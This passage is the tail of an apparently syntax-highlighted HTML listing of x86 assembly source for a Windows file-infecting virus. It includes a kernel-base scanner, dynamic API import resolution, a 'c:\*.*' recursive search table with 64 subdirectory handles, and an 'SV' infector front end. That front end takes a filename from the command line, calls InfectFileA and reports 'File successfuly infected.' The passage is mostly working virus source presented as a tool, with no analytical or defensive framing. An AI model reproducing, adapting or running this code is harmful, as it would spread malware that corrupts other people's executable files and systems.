        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">StrLen</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GetKrnlBase</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;parm: edx = begin [esp]</span><span class="sc0">
</span><span class="sc1">;ret: edx = kernel base</span><span class="sc0">
</span><span class="sc5">KrnlSrch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0b4h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">GetKrnlBase</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetKrnlBase</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">FndHndlIndx</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NDrives</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">DriveIndx</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'c'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">':\'
</span><span class="sc5">PathName</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">;6="c:\*.*"</span><span class="sc0">

</span><span class="sc5">VirusEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">TimerHndl</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">sEBX</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sECX</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sEDX</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sEDI</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sESI</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sEBP</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">FHndl</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">wfd</span><span class="sc0">             </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">FndHndl</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;Max 64 subdirs (c:\1\2\3\4\...\64)</span><span class="sc0">

</span><span class="sc5">Save1</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Save2</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RelSz</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RelRVA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RelFle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">PlusEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">KrnlImport</span><span class="sc0">      </span><span class="sc5">SGetCmdLine</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'GetCommandLineA'</span><span class="sc0">
</span><span class="sc5">SVStr</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SV filename.exe'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CmdLnStr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'You have to drag a file to the infector EXE or to specify the name of the file to infect with the command line.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OkStr</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'File successfuly infected.'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BadStr</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'The file cannot be infected!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetKrnlBase</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">PLoadLib</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">PGetProcAdr</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SGetCmdLine</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SCreateFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFSize</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SFSeek</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SReadFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SWriteFile</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SCloseHndl</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SMAlloc</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SMFree</span><span class="sc0">
        </span><span class="sc5">DoKrnlImport</span><span class="sc0">    </span><span class="sc5">SExit</span><span class="sc0">
        </span><span class="sc5">LoadLibrary</span><span class="sc0">     </span><span class="sc5">User32</span><span class="sc0">
        </span><span class="sc5">DoImport</span><span class="sc0"> </span><span class="sc5">SMsgBox</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SGetCmdLine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'"'</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">repz</span><span class="sc0">    </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Save2</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">SVNoCL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectFileA</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SVNoInf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">MB_OK</span><span class="sc4">+</span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OkStr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Save2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SVMsgBx</span><span class="sc0">
</span><span class="sc5">SVNoInf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">MB_OK</span><span class="sc4">+</span><span class="sc5">MB_ICONERROR</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BadStr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">Save2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SVMsgBx</span><span class="sc0">
</span><span class="sc5">SVNoCL</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc5">MB_OK</span><span class="sc4">+</span><span class="sc5">MB_ICONWARNING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SVStr</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CmdLnStr</span><span class="sc0">
</span><span class="sc5">SVMsgBx</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">CallImp</span><span class="sc0"> </span><span class="sc5">SMsgBox</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SExit</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">PCode</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span></div></body>
</html>
